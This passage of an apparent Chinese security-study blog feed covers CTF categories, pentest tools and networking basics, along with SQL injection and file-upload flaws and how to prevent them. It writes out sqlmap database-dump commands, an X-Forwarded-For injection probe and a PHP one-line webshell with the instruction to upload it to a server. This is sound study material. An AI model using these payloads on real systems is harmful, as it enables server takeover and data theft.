注入等。也有一些简单的关于网络基础知识的考察，如返回包、TCP/IP、数据包内容和构造。可以说题目环境比较接近真实环境。<br>-所需知识：PHP、Python、TCP/IP、SQL</p><p>-Crypto<br>-题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术，以及一些常见编码解码，主要考查参赛选手密码学相关知识点。通常也会和其他题目相结合。<br>-所需知识：矩阵、数论、密码学</p><p>-Misc<br>-Misc 即安全杂项，题目涉及隐写术、流量分析、电子取证、人肉搜索、数据分析、大数据统计等，覆盖面比较广，主要考查参赛选手的各种基础综合知识。<br>-所需知识：常见隐写术工具、Wireshark 等流量审查工具、编码知识</p><p>-Mobile<br>-主要分为 Android 和 iOS 两个平台，以 Android 逆向为主，破解 APK 并提交正确答案。<br>-所需知识：Java，Android 开发，常见工具</p><h2 id="至于知识点"><a href="#至于知识点" class="headerlink" title="至于知识点"></a>至于知识点</h2><p>linux基础<br>HTML基础<br>HTTP协议基础<br>JAVASCRIPT基础<br>Web服务器基础<br>Owasp漏洞基础<br>PHP代码审计基础</p><p>C/C++基础<br>汇编语言基础(我目前的努力方向)</p><h2 id="汇编语言基础相关（以x86为核心）"><a href="#汇编语言基础相关（以x86为核心）" class="headerlink" title="汇编语言基础相关（以x86为核心）"></a>汇编语言基础相关（以x86为核心）</h2></body></html>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot;</summary>
        
      
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/CTF/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>学学学</title>
    <link href="https://www.maonie.top/2024/06/01/%E5%AD%A6%E5%AD%A6%E5%AD%A6/"/>
    <id>https://www.maonie.top/2024/06/01/%E5%AD%A6%E5%AD%A6%E5%AD%A6/</id>
    <published>2024-06-01T01:01:38.000Z</published>
    <updated>2024-06-03T04:29:26.221Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>差不多类似于现状汇报？</p><ul><li>还活着</li><li>转段考通过了 考进大学了</li><li>目前在健身+寻找新的爱好 目标</li></ul><p>破费在阿里云里花了600多 开了个teamspeak服务器<br>嘛 至少能坚持三年 结果是令人满意的<br>至于开服的具体细节 还请自行搜索</p></body></html>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot;</summary>
        
      
    
    
    
    <category term="日常牢骚" scheme="https://www.maonie.top/categories/%E6%97%A5%E5%B8%B8%E7%89%A2%E9%AA%9A/"/>
    
    
    <category term="告示" scheme="https://www.maonie.top/tags/%E5%91%8A%E7%A4%BA/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试相关</title>
    <link href="https://www.maonie.top/2024/05/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3/"/>
    <id>https://www.maonie.top/2024/05/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3/</id>
    <published>2024-05-06T07:47:16.000Z</published>
    <updated>2024-05-08T03:49:14.508Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>目前确定的说法之渗透测试的<strong>生命周期</strong></p><blockquote><p>渗透测试项目的生命周期可分为如下7个阶段：需求分析、信息收集、威胁建模、漏洞分析、漏洞利用、后渗透测试、撰写报告。<br>以下是PETS渗透测试项目生命周期的主要阶段：<br>1.前期交互阶段：<br>•与客户组织进行深入讨论，明确渗透测试的范围和目标。<br>•确保客户组织了解并同意测试所涉及的内容，从而确保测试的顺利进行。<br>2.情报搜集阶段：<br>•使用各种方法和技术来收集目标系统的信息，包括操作系统、开放的端口、网络架构等。<br>•通过社交媒体网络、Google Hacking技术、目标系统踩点等方式获取目标系统的详细信息。<br>3.威胁建模阶段：<br>•利用情报搜集阶段获取的信息，分析目标系统上可能存在的安全漏洞和弱点。<br>•识别潜在的安全风险，并为后续的渗透攻击阶段制定策略。<br>4.漏洞分析阶段：<br>•综合前面阶段获取的信息，分析哪些攻击途径是可行的。<br>•评估漏洞的严重程度和潜在影响，为攻击阶段提供决策依据。<br>5.渗透攻击阶段：<br>•根据前面的分析结果，对目标系统实施渗透攻击。<br>•尝试利用已发现的漏洞，获取目标系统的权限或访问敏感数据。<br>6.后渗透攻击阶段：<br>•在成功渗透后，进一步探索目标系统，获取更多的信息和权限。<br>•评估客户组织可能面临的最大业务风险，并提供相应的安全建议。<br>7.报告阶段：<br>•编写详细的渗透测试报告，记录测试过程和发现的问题。<br>•从防御者的角度提出针对性的安全建议和改进措施，帮助客户组织加强安全防护。<br>请注意，每个阶段都至关重要，需要精心设计和执行。同时，与客户保持良好的沟通和合作也是确保测试成功的关键。在整个生命周期中，测试人员需要遵循安全准则和最佳实践，确保测试的合法性和道德性。</p></blockquote><p>熟记即可<br><strong>简述题</strong> 列举常用渗透测试工具。</p><blockquote><p>信息收集类工具有nmap、fping、dnsmap等<br>漏洞分析类工具有sqlmap、nessus、awvs等<br>漏洞利用类工具有metasploit、burpsuite等<br>密码破解类工具有hydra、john、hashcat等<br>数据分析类工具有wireshark等。</p></blockquote><p>简述扫描技术的分类<br>扫描技术按照不同划分标准有不同的分类方式。如按照扫描技术分类可分为TCP扫描、UDP扫描，ICMP扫描、ARP扫描。其中TCP扫描又分为TCP CONNECT()扫描、TCP SYN扫描（这种方法较为常见）。ARP扫描效率较高，但不能跨网段，且工作在数据链路层，主要用于探测本地局域网中的主机存活情况。按照扫描所使用协议的工作层次，可分为二层扫描（ARP）、三层扫描（ICMP、IP）和四层扫描技术（TCP、UDP）。</p><span id="more"></span><p>然后是渗透测试要用到的工具相关</p><h1 id="一、nmap"><a href="#一、nmap" class="headerlink" title="一、nmap"></a>一、nmap</h1><p>nmap的主要功能包括目标主机存活性扫描(-sn)、端口扫描（-sS或-p80,443）、操作系统信息探测(-O)、漏洞信息探测(–script==default)。</p><p>nmap如下选项具体用途（-sn，-p-，-sV，-O，-sT，-sS，-sU）</p><pre class="line-numbers language-none"><code class="language-none">-sn 主机存活性扫描，类似于-sP;-p- 全端口扫描，类似于-p1-65535-sV 服务及版本扫描-O 操作系统类型探测-sT 全连接扫描（与目标建立完整三次握手）-sS 半连接扫描-sU UDP方式扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>简述nmap探测主机存活的技术有哪些？</strong></p><p><strong>Q:</strong> 按照扫描技术分类，Nmap的扫描可以分为TCP扫描、UDP扫描、ICMP扫描和ARP扫描等。</p><ol><li><strong>TCP</strong> <strong>扫描</strong>：TCP扫描是最常用的扫描类型之一，主要用于探测目标主机上开放的TCP端口和提供的TCP服务。TCP扫描又可以分为TCP connect()扫描和TCP SYN扫描等方法。<br>o  <strong>TCP connect()</strong> <strong>扫描</strong>：这是最基本的TCP扫描方式，通过尝试与目标主机的每个TCP端口建立完整的三次握手连接来判断端口是否开放。<br>o  <strong>TCP SYN</strong> <strong>扫描</strong>：SYN扫描是Nmap的默认扫描方式。它向目标主机的端口发送一个SYN数据包，并等待SYN/ACK响应。如果收到响应，则认为该端口是开放的。SYN扫描的优点是速度快且不易被检测到，因为它不会完成整个三次握手。</li><li><strong>UDP</strong> <strong>扫描</strong>：UDP扫描用于探测目标主机上开放的UDP端口。由于UDP是无连接的协议，因此UDP扫描通常比TCP扫描更困难。</li><li><strong>ICMP</strong> <strong>扫描</strong>：ICMP扫描主要利用ICMP协议来探测目标主机的网络连通性和可达性。</li><li><strong>ARP</strong> <strong>扫描</strong>：ARP扫描是一种在本地局域网中非常有效的主机发现方法。它通过发送ARP请求来探测目标主机是否存活。ARP扫描的效率很高，但不能跨网段，且只能扫描主机存活情况，不能探测端口开放情况。<br>其次，按照扫描所使用的协议工作层次，Nmap的扫描可以分为二层扫描（ARP）、三层扫描（ICMP、IP）和四层扫描技术（TCP、UDP）。</li></ol><p>·     <strong>二层扫描（ARP）</strong>：在数据链路层进行扫描，主要用于探测本地局域网中的主机存活情况。<br>·     <strong>三层扫描（ICMP、IP）</strong>：在网络层进行扫描，主要用于探测目标主机的网络连通性和可达性。<br>·     <strong>四层扫描（TCP、UDP）</strong>：在传输层进行扫描，主要用于探测目标主机上开放的TCP和UDP端口以及提供的服务。<br>总的来说，Nmap的扫描技术非常丰富和灵活，可以根据不同的需求和目的选择不同的扫描类型选项，以获取更全面和详细的扫描结果。</p><h1 id="二、sqlmap"><a href="#二、sqlmap" class="headerlink" title="二、sqlmap"></a>二、sqlmap</h1><h2 id="总之介绍一下各种参数吧"><a href="#总之介绍一下各种参数吧" class="headerlink" title="总之介绍一下各种参数吧"></a>总之介绍一下各种参数吧</h2><p>一般起始是python sqlmap.py</p><p>-u 决定目标url<br><code>sqlmap -u '目标地址'</code><br>–cookie 设置cookie 绕过安全检查<br><code>sqlmap -u '目标地址' --cookie 'cookie值'</code><br>–dbs 列出所有数据库<br><code>sqlmap -u '目标地址' --dbs</code><br>-D 指定数据库 –tables 爆出所有表<br><code>sqlmap -u '目标地址' -D '库名' --tables</code><br>-T 指定表 –dump 爆出所有数据<br><code>sqlmap -u '目标地址' -D '库名' -T '表名' --dump</code><br>–current-user 显示当前用户<br><code>sqlmap -u '目标地址' --current-user</code><br>–is-dba 检测是否为数据库管理员<br><code>sqlmap -u '目标地址' --is-dba</code><br>–users 获取所有用户<br><code>sqlmap -u '目标地址' --users</code></p><h2 id="然后是手动注入"><a href="#然后是手动注入" class="headerlink" title="然后是手动注入"></a>然后是手动注入</h2><p>这块我不太懂先略过</p><h1 id="三、BURPSUITE"><a href="#三、BURPSUITE" class="headerlink" title="三、BURPSUITE"></a>三、BURPSUITE</h1><p>主要是针对web应用程序的攻击 一款集成化的渗透测试工具<br>主要功能是抓包 改包 自带一个暴力破解模块 有四种attack type(攻击类型)</p><ul><li>Sinper（狙击手）</li><li>Battering ram（攻城槌）</li><li>Pitchfork（干草叉）</li><li>Cluster bomb（集束炸弹）</li></ul><h1 id="四、Ettercap"><a href="#四、Ettercap" class="headerlink" title="四、Ettercap"></a>四、Ettercap</h1><p>主要用于伪造或篡改数据包以实现SRP DNS协议的中间人攻击<br>没了</p><h1 id="五、metasploit"><a href="#五、metasploit" class="headerlink" title="五、metasploit"></a>五、metasploit</h1><p>Metasploit框架的核心组成部分包括exploit（漏洞利用模块）、payload（负载模块）、auxiliary（辅助模块）和post（后渗透模块）<br>exploit模块负责利用目标系统的漏洞<br>payload模块则负责在成功利用漏洞后执行特定任务<br>auxiliary模块提供非攻击性质的功能 如扫描、枚举和信息收集<br>post模块则用于在取得目标系统权限后进行进一步的信息收集和权限维持</p></body></html>]]></content>
    
    
    <summary type="html">&lt;p&gt;目前确定的说法之渗透测试的&lt;strong&gt;生命周期&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;渗透测试项目的生命周期可分为如下7个阶段：需求分析、信息收集、威胁建模、漏洞分析、漏洞利用、后渗透测试、撰写报告。&lt;br&gt;以下是PETS渗透测试项目生命周期的主要阶段：&lt;br&gt;1.	前期交互阶段：&lt;br&gt;•	与客户组织进行深入讨论，明确渗透测试的范围和目标。&lt;br&gt;•	确保客户组织了解并同意测试所涉及的内容，从而确保测试的顺利进行。&lt;br&gt;2.	情报搜集阶段：&lt;br&gt;•	使用各种方法和技术来收集目标系统的信息，包括操作系统、开放的端口、网络架构等。&lt;br&gt;•	通过社交媒体网络、Google Hacking技术、目标系统踩点等方式获取目标系统的详细信息。&lt;br&gt;3.	威胁建模阶段：&lt;br&gt;•	利用情报搜集阶段获取的信息，分析目标系统上可能存在的安全漏洞和弱点。&lt;br&gt;•	识别潜在的安全风险，并为后续的渗透攻击阶段制定策略。&lt;br&gt;4.	漏洞分析阶段：&lt;br&gt;•	综合前面阶段获取的信息，分析哪些攻击途径是可行的。&lt;br&gt;•	评估漏洞的严重程度和潜在影响，为攻击阶段提供决策依据。&lt;br&gt;5.	渗透攻击阶段：&lt;br&gt;•	根据前面的分析结果，对目标系统实施渗透攻击。&lt;br&gt;•	尝试利用已发现的漏洞，获取目标系统的权限或访问敏感数据。&lt;br&gt;6.	后渗透攻击阶段：&lt;br&gt;•	在成功渗透后，进一步探索目标系统，获取更多的信息和权限。&lt;br&gt;•	评估客户组织可能面临的最大业务风险，并提供相应的安全建议。&lt;br&gt;7.	报告阶段：&lt;br&gt;•	编写详细的渗透测试报告，记录测试过程和发现的问题。&lt;br&gt;•	从防御者的角度提出针对性的安全建议和改进措施，帮助客户组织加强安全防护。&lt;br&gt;请注意，每个阶段都至关重要，需要精心设计和执行。同时，与客户保持良好的沟通和合作也是确保测试成功的关键。在整个生命周期中，测试人员需要遵循安全准则和最佳实践，确保测试的合法性和道德性。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;熟记即可&lt;br&gt;&lt;strong&gt;简述题&lt;/strong&gt; 列举常用渗透测试工具。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;信息收集类工具有nmap、fping、dnsmap等&lt;br&gt;漏洞分析类工具有sqlmap、nessus、awvs等&lt;br&gt;漏洞利用类工具有metasploit、burpsuite等&lt;br&gt;密码破解类工具有hydra、john、hashcat等&lt;br&gt;数据分析类工具有wireshark等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;简述扫描技术的分类&lt;br&gt;扫描技术按照不同划分标准有不同的分类方式。如按照扫描技术分类可分为TCP扫描、UDP扫描，ICMP扫描、ARP扫描。其中TCP扫描又分为TCP CONNECT()扫描、TCP SYN扫描（这种方法较为常见）。ARP扫描效率较高，但不能跨网段，且工作在数据链路层，主要用于探测本地局域网中的主机存活情况。按照扫描所使用协议的工作层次，可分为二层扫描（ARP）、三层扫描（ICMP、IP）和四层扫描技术（TCP、UDP）。&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>协议/漏洞/网络</title>
    <link href="https://www.maonie.top/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/"/>
    <id>https://www.maonie.top/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/</id>
    <published>2024-05-05T02:10:55.000Z</published>
    <updated>2024-05-14T00:41:38.803Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>从头到尾再来一遍的感觉吧</p><span id="more"></span><h1 id="一、协议相关"><a href="#一、协议相关" class="headerlink" title="一、协议相关"></a>一、协议相关</h1><blockquote><p>网络通信协议是根据网络上的节点进行通信的一组规则，每种设备都可以根据通信协议识别其他设备的信息。</p></blockquote><h2 id="OSI七层模型"><a href="#OSI七层模型" class="headerlink" title="OSI七层模型"></a>OSI七层模型</h2><p>要讲网络协议 我们得先从OSI七层模型说起 OSI将网络通信分为七个层次 每个层次负责特定的功能 并且每个层次都与特定的协议相关联<br>它们分别为物理层、数据链路层、网络层、传输层、会话层、表示层和应用层</p><ol><li><strong>物理层：把网络连接在一起的物理手段 负责传送0与1的电信号</strong></li><li><strong>数据链路层：决定0与1的解读 分组方式</strong> 相关协议:ARP协议</li><li><strong>网络层：引进一套新的地址——“网络地址” 使得我们能区分不同的计算机是否属于同一个子网络 建立主机到主机的通信</strong> 相关协议：IP、ICMP协议</li><li><strong>传输层：有了MAC地址和IP地址 我们还需要一个参数 表示这个数据包到底供哪个程序来使用 这个参数就叫’端口’ 实现端口到端口的通信</strong> 相关协议：TCP、UDP协议</li><li><strong>会话层：负责建立和断开通信连接，以及数据的分割等传输相关的管理 （例：何时建立连接？何时断开连接？该保持多久的连接？）</strong>相关协议：SSL、TLS协议</li><li><strong>表示层：设备固有的数据格式与网络标准数据格式之间的转换 （接受不同的信息，例如文字流、图像、声音等）</strong></li><li><strong>应用层：针对特定应用的协议 网络服务与最终用户的一个接口</strong> 相关协议：HTTP、FTP、DNS、DHCP等协议<br><img data-src="/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/1.png" alt="1"></li></ol><h2 id="HTTP协议-端口号80-HTTPS协议-端口号443"><a href="#HTTP协议-端口号80-HTTPS协议-端口号443" class="headerlink" title="HTTP协议 端口号80 HTTPS协议 端口号443"></a>HTTP协议 端口号80 HTTPS协议 端口号443</h2><p><strong>Web交互的基本流程</strong><br>请求：客户端根据服务器地址把数据发送给服务器的过程叫请求。<br>响应：服务器将请求的处理结果发送给浏览器的过程叫响应。</p><p><strong>什么是HTTP？</strong><br>概念：超文本传输协议。</p><h3 id="HTTP有什么特点？"><a href="#HTTP有什么特点？" class="headerlink" title="HTTP有什么特点？"></a><strong>HTTP有什么特点？</strong></h3><ol><li><p><strong>简单和灵活</strong>：</p><ul><li>HTTP协议使用简单的请求-响应模型，通信过程直观明了。它支持各种数据格式和内容类型，使得可以在网络上传输各种类型的数据。</li></ul></li><li><p><strong>无连接和无状态</strong>：</p><ul><li>HTTP协议是无连接的，即每次请求都是独立的，服务器不会保持与客户端的连接状态。同时，HTTP是无状态的，服务器不会保存请求之间的状态信息，每个请求都是独立的，这使得HTTP协议具有简单性和可伸缩性，但同时需要通过其他机制（如Cookie、Session）来管理用户状态。</li></ul></li><li><p><strong>基于文本</strong>：</p><ul><li>HTTP协议的请求和响应都是基于文本的，使用ASCII字符进行通信，这使得HTTP消息可以被直接查看和调试。</li></ul></li><li><p><strong>支持客户端-服务器模式</strong>：</p><ul><li>HTTP协议基于客户端-服务器模式，客户端发送请求，服务器返回响应。这种模式灵活且符合互联网应用的需求。</li></ul></li><li><p><strong>支持缓存机制</strong>：</p><ul><li>HTTP协议支持缓存机制，可以通过缓存技术减少网络传输，提高性能和用户体验。</li></ul></li><li><p><strong>扩展性</strong>：</p><ul><li>HTTP协议具有良好的扩展性，支持通过标头（Header）字段传递各种自定义信息，可以实现更复杂的功能和应用。</li></ul></li></ol><h3 id="HTTP有什么作用？"><a href="#HTTP有什么作用？" class="headerlink" title="HTTP有什么作用？"></a><strong>HTTP有什么作用？</strong></h3><ol><li><p><strong>传输网页和超文本内容</strong>：</p><ul><li>HTTP协议最基本的作用是传输网页和超文本内容。通过HTTP，浏览器可以向服务器请求网页，服务器则返回包含HTML、CSS、JavaScript等内容的响应，完成页面的展示和渲染。</li></ul></li><li><p><strong>传输各种类型的数据</strong>：</p><ul><li>除了网页，HTTP还可以传输各种类型的数据，如图像、音频、视频、文件等。HTTP支持多种内容类型和数据格式，使得互联网上的资源能够以统一的方式进行访问和传输。</li></ul></li><li><p><strong>实现客户端和服务器之间的通信</strong>：</p><ul><li>HTTP作为客户端和服务器之间的通信协议，使得客户端能够向服务器发送请求并接收响应。这种通信模式支持了各种互联网应用的实现，如浏览器访问网页、移动应用与服务器通信等。</li></ul></li><li><p><strong>支持Web应用的交互</strong>：</p><ul><li>HTTP协议支持通过请求和响应实现Web应用的交互功能，如用户登录、数据提交、状态管理等。</li></ul></li></ol><p>在网络通信中，请求头（Request Header）和响应头（Response Header）是HTTP协议中的重要部分，用于在客户端和服务器之间传递关于请求或响应的元数据信息。下面是它们的作用和常见字段的含义：</p><h3 id="请求头（Request-Header）"><a href="#请求头（Request-Header）" class="headerlink" title="请求头（Request Header）"></a>请求头（Request Header）</h3><p>请求头包含了客户端向服务器发送的请求的附加信息，这些信息描述了请求本身的性质、格式、认证信息等。常见的请求头字段包括：</p><ol><li><p><strong>User-Agent</strong></p><ul><li>含义：标识了发起请求的用户代理（通常是浏览器或应用程序）的相关信息，如操作系统、浏览器类型和版本号等。</li></ul></li><li><p><strong>Host</strong></p><ul><li>含义：指定被请求资源的主机名和端口号。</li></ul></li><li><p><strong>Accept</strong></p><ul><li>含义：指定客户端可接受的内容类型，用于服务器返回合适的响应。</li></ul></li><li><p><strong>Content-Type</strong></p><ul><li>含义：指定请求体的MIME类型，告诉服务器请求中的内容格式是什么样的。</li></ul></li><li><p><strong>Authorization</strong></p><ul><li>含义：包含用于对请求进行身份验证的凭据，通常用于发送身份验证信息（如基本认证或令牌）。</li></ul></li></ol><h3 id="响应头（Response-Header）"><a href="#响应头（Response-Header）" class="headerlink" title="响应头（Response Header）"></a>响应头（Response Header）</h3><p>响应头包含了服务器对客户端请求的响应的元数据信息，用于描述响应的属性、类型、缓存设置等。常见的响应头字段包括：</p><ol><li><p><strong>Content-Type</strong></p><ul><li>含义：指定响应体的MIME类型，告诉客户端响应的内容格式是什么样的。</li></ul></li><li><p><strong>Content-Length</strong></p><ul><li>含义：指定响应体的长度，以字节为单位。</li></ul></li><li><p><strong>Cache-Control</strong></p><ul><li>含义：控制缓存的行为，例如是否缓存响应、缓存的有效期等。</li></ul></li><li><p><strong>Set-Cookie</strong></p><ul><li>含义：在响应中设置Cookie，将会在客户端保存，用于跟踪会话状态或其他状态信息。</li></ul></li><li><p><strong>Location</strong></p><ul><li>含义：用于重定向，指示客户端应该跳转到的新位置。</li></ul></li></ol><h3 id="其他常见字段"><a href="#其他常见字段" class="headerlink" title="其他常见字段"></a>其他常见字段</h3><p>除了上述字段外，还有许多其他常见的请求头和响应头字段，用于控制和描述HTTP请求和响应的各个方面。例如：</p><ul><li><strong>Date</strong>：指定消息创建的日期和时间。</li><li><strong>Server</strong>：指示服务器的软件信息。</li><li><strong>ETag</strong>：用于缓存验证，表示资源的标识符。</li><li><strong>Referer</strong>：指示请求的来源页面 URL。</li><li><strong>Connection</strong>：控制连接的选项，如保持长连接或关闭连接等。</li></ul><p>这些请求头和响应头字段的合理设置和使用，能够有效地控制HTTP请求和响应的行为，提高通信的效率和安全性。</p><h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><p>ARP协议的核心作用是在局域网内解析IP地址到MAC地址的映射关系，帮助设备确定数据包的接收方，从而实现有效的网络通信。</p><h2 id="DNS协议-端口号53"><a href="#DNS协议-端口号53" class="headerlink" title="DNS协议 / 端口号53"></a>DNS协议 / 端口号53</h2><p><strong>域名解析协议（DNS，Domain Name System）的用途是将域名和 IP 地址相互映射</strong></p><h1 id="二、漏洞相关"><a href="#二、漏洞相关" class="headerlink" title="二、漏洞相关"></a>二、漏洞相关</h1><p>讲讲漏洞的 <strong>成因 攻击方式/类型 预防方式</strong> </p><h2 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h2><p><strong>产生原因</strong><br>本质上是程序员没有遵循代码与数据分离原则 使用户数据作为代码执行 </p><blockquote><p>当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p></blockquote><p><strong>攻击方式/类型</strong><br>类型有 字符型或者数字型</p><ol><li>get注入<br>在get传参时写入参数，将SQl语句闭合，后面加写入自己的SQL语句。</li><li>post注入<br>通过post传参，原理与get一样，重要的是判断我们所输入的信息是否与数据库产生交互，其次判断SQL语句是如何闭合的。</li><li>有些网站通过查询cookie判断用户是否登录，需要与数据库进行交互，我们可以修改cookie的值，查找我们所需要的东西。或者通过报错注入是网页返回报错信息。</li><li>Referer注入<br>Referer正确写法应该是Referrer,因为http规定时写错只能将错就错，有些网站会记录ip和访问路径，例如百度就是通过Referer来统计网站流量，我们将访问路径进行SQL注入，同样也可以得到想要的信息。</li><li>XFF注入<br>在用户登录注册模块在 HTTP 头信息添加 X-Forwarded-for: 9.9.9.9’ ，用户在注册的时候，如果存在安全隐 患，会出现错误页面或者报错。从而导致注册或者登录用户失败。<br>burpsuite 抓包，提交输入检测语句：</li></ol><pre class="line-numbers language-text" data-language="text"><code class="language-text">X-Forwarded-for: 127.0.0.1'and 1=1#X-Forwarded-for: 127.0.0.1'and 1=2#//两次提交返回不一样，存在 SQL 注入漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="6"><li>UA注入：输入点在User-Agent</li></ol><p><strong>sql语句相关</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">show databases; //显示数据库列表SELECT * FROM users; //检索数据insert into; //向数据表中插入新记录update; //更新表中记录delete from; //用于从数据表中删除数据create table; //创建新的数据库sum() //计算某列的总和count() //计算指定列的行数avg() min() max() abs() //平均值 最小值 最大值 绝对值TRUNCATE //清空某个表的数据drop //直接把表删了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>如何预防</strong><br>为了防止 SQL 注入攻击，可以采取以下几种防御方式：</p><ol><li><strong>使用参数化查询（Prepared Statements）</strong>：<ul><li>使用参数化查询是最有效的防御 SQL 注入的方法之一。参数化查询使用占位符（如 <code>?</code>）代替直接将用户输入嵌入到 SQL 查询中，然后将参数与查询分离，确保用户输入不会被当作 SQL 代码执行。</li></ul></li><li><strong>输入验证与过滤</strong>：<ul><li>对于用户输入的数据，进行严格的输入验证和过滤，只接受预期的数据格式和范围。例如，对于数字输入，确保只包含数字字符；对于字符串输入，可以使用白名单过滤非法字符。</li><li>在应用程序的前端和后端都进行输入验证，防止恶意输入进入系统。</li></ul></li><li><strong>最小权限原则（Least Privilege Principle）</strong>：<ul><li>遵循最小权限原则，为数据库用户分配最小必要的权限。应用程序连接数据库时，使用有限权限的数据库账号，避免使用具有过高权限的账号。</li></ul></li><li><strong>避免拼接 SQL 语句</strong>：<ul><li>避免将用户输入直接拼接到 SQL 查询语句中。即使对于动态构建的查询，也应该使用参数化查询或者安全的 ORM（对象关系映射）工具，而不是手动拼接字符串。</li></ul></li><li><strong>ORM 框架的使用</strong>：<ul><li>使用 ORM 框架（如Hibernate、Entity Framework等）可以帮助自动化地处理数据库访问和数据映射，减少手动编写 SQL 查询的机会，从而降低 SQL 注入的风险。</li></ul></li><li><strong>安全编码实践</strong>：<ul><li>培训开发人员和测试人员，提高他们对安全编码的认识，编写安全的代码和进行安全审计。</li><li>定期更新和维护应用程序和数据库系统，及时修复已知的安全漏洞。</li></ul></li><li><strong>监控与日志记录</strong>：<ul><li>实施安全监控和日志记录机制，及时发现和响应潜在的 SQL 注入攻击行为。</li></ul></li><li><strong>安全审计</strong>：<ul><li>定期进行安全审计和漏洞扫描，及时发现并修复存在的安全问题。</li></ul></li></ol><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p><strong>漏洞成因</strong></p><blockquote><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p></blockquote><p><strong>攻击方式/类型</strong><br>主要在于一句话木马的组成方式</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php eval($_POST['cmd']);?&gt;↑这就是最简单的一句话木马其中的$_POST可以替换为$_GET或者$_REQUEST分别代表POST传参 GET传参 两者皆可eval是命令执行函数其余的分别有：eval()：将字符串作为 PHP 代码执行。system()：执行系统命令并返回输出。exec()：执行外部命令。shell_exec()：执行 shell 命令并返回输出。passthru()：执行外部命令并将原始输出发送到输出。popen()：打开进程文件指针。proc_open()：执行命令并打开进程文件指针。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>随后把包含该内容的php文件上传至服务器 利用中国菜刀 蚁剑等软件连接即可</p><p><strong>防御方式</strong><br>检查文件类型 检查文件大小 传文件后更改文件名称 对文件内容进行检查与过滤</p><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" 